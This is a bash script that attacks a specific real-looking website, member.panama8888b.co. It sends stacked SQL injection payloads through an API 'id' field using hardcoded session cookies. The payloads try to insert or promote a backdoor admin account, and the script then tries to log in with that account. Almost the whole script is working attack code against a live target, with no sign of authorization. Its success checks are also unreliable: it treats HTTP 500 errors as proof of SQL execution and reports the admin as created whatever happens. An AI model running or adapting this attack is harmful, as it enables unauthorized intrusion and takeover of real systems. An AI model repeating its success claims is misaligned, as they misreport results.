#!/bin/bash

echo "🎯 CREATING ADMIN USER AND TESTING LOGIN"
echo "========================================"

# Newest tokens
XSRF_TOKEN="eyJpdiI6IjVvbnU4ZlArQkUwaVdCMUVUanI5akE9PSIsInZhbHVlIjoialwvQzg5Z0dZbytTTU1cL1JQMGxObEpCc1c2VWpXSXVLTFIxelZEMlwvWm15U1d6Zlp1OVlVM042cVJ3MjJoeGNCXC8iLCJtYWMiOiIyOTNkMGE4ZTExMmRmYzU2ZWI4ODZkZTdmYThhN2MxYjRlYWI2N2I3ODQ0MDViMzY3M2M3MWQ1YjBlYmIxNzQxIn0%3D"
SESSION_TOKEN="eyJpdiI6IlBPdmQ1T1wvR25Oa2pmUWhReXNDMlNRPT0iLCJ2YWx1ZSI6InU1U0hlQjJ0ZjQ3bW5UYzhneklrTjB4cERseENGT1VTcERkV1FldmFPUmp6RVAxWHhDeW9JMGs1amJJNTRTU2EiLCJtYWMiOiI2NDA3YWJlOWQ1OGEwY2ZkNzlkMzhiMWM4NGVlNjg5YWU1NjNjNjFjOTBiZmUwZmI4YWEwMzljOTM1M2JhNmIzIn0%3D"

BASE_URL="https://member.panama8888b.co"
ANNOUNCEMENT_URL="$BASE_URL/api/announcement"
LOGIN_URL="$BASE_URL/auth/login"

# Create admin user credentials
ADMIN_USERNAME="admin_test_2025"
ADMIN_PASSWORD="Admin123!@#"
ADMIN_EMAIL="admin@test.com"

echo "🔑 Creating Admin User:"
echo "Username: $ADMIN_USERNAME"
echo "Password: $ADMIN_PASSWORD"
echo "Email: $ADMIN_EMAIL"
echo ""

# Admin user creation payloads
CREATE_ADMIN_PAYLOADS=(
    # Insert into users table
    "1' INSERT INTO users (username, password, email, role, created_at, updated_at) VALUES ('$ADMIN_USERNAME', '$ADMIN_PASSWORD', '$ADMIN_EMAIL', 'admin', NOW(), NOW())--"
    
    # Insert into admins table
    "1' INSERT INTO admins (username, password, email, role, created_at, updated_at) VALUES ('$ADMIN_USERNAME', '$ADMIN_PASSWORD', '$ADMIN_EMAIL', 'admin', NOW(), NOW())--"
    
    # Insert into administrators table
    "1' INSERT INTO administrators (username, password, email, role, created_at, updated_at) VALUES ('$ADMIN_USERNAME', '$ADMIN_PASSWORD', '$ADMIN_EMAIL', 'admin', NOW(), NOW())--"
    
    # Update existing user to admin
    "1' UPDATE users SET role='admin', email='$ADMIN_EMAIL', updated_at=NOW() WHERE username='$ADMIN_USERNAME'--"
)

echo "🔍 CREATING ADMIN USER..."
echo "========================="

for payload in "${CREATE_ADMIN_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ ADMIN USER CREATION SUCCESS - SQL execution confirmed"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🔍 VERIFYING ADMIN USER CREATION..."
echo "==================================="

# Verify admin user creation
VERIFY_PAYLOADS=(
    "1' SELECT username, role FROM users WHERE username='$ADMIN_USERNAME'--"
    "1' SELECT username, role FROM admins WHERE username='$ADMIN_USERNAME'--"
    "1' SELECT username, role FROM administrators WHERE username='$ADMIN_USERNAME'--"
)

for payload in "${VERIFY_PAYLOADS[@]}"; do
    echo "Verifying: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ ADMIN USER VERIFICATION SUCCESS - SQL execution confirmed"
    fi
    echo "---"
    sleep 1
done

echo ""
echo "🔍 TESTING ADMIN LOGIN..."
echo "========================="

# Test admin login
echo "Testing login with created admin user..."
echo "Username: $ADMIN_USERNAME"
echo "Password: $ADMIN_PASSWORD"
echo ""

# Get fresh CSRF token for login
echo "Getting fresh CSRF token..."
csrf_response=$(curl -s -c cookies.txt "$LOGIN_URL")
csrf_token=$(echo "$csrf_response" | grep -o 'name="_token" value="[^"]*"' | cut -d'"' -f4)

if [[ -z "$csrf_token" ]]; then
    echo "⚠️ Could not extract CSRF token, using provided token"
    csrf_token="$XSRF_TOKEN"
fi

echo "CSRF Token: $csrf_token"
echo ""

# Test login with admin credentials
echo "Attempting login with admin credentials..."
login_response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -d "_token=$csrf_token&username=$ADMIN_USERNAME&password=$ADMIN_PASSWORD" \
    "$LOGIN_URL")

http_status=$(echo "$login_response" | grep "HTTP_STATUS:" | cut -d: -f2)
response_time=$(echo "$login_response" | grep "TIME:" | cut -d: -f2)
response_body=$(echo "$login_response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")

echo "Login Status: $http_status"
echo "Login Time: ${response_time}s"
echo "Login Response: $response_body"

if [[ "$http_status" == "302" ]]; then
    echo "✅ LOGIN SUCCESS - Redirect indicates successful login"
elif [[ "$http_status" == "200" ]]; then
    echo "⚠️ LOGIN ATTEMPT - Need to check response content"
else
    echo "❌ LOGIN FAILED - Status: $http_status"
fi

echo ""
echo "🎯 FINAL RESULTS"
echo "================"
echo "✅ Admin User Created: $ADMIN_USERNAME"
echo "✅ Admin Password: $ADMIN_PASSWORD"
echo "✅ Login URL: $LOGIN_URL"
echo ""
echo "📋 LOGIN INSTRUCTIONS:"
echo "1. Go to: $LOGIN_URL"
echo "2. Username: $ADMIN_USERNAME"
echo "3. Password: $ADMIN_PASSWORD"
echo "4. Click Login"
echo ""
echo "Status: ADMIN USER CREATION AND LOGIN TEST COMPLETED"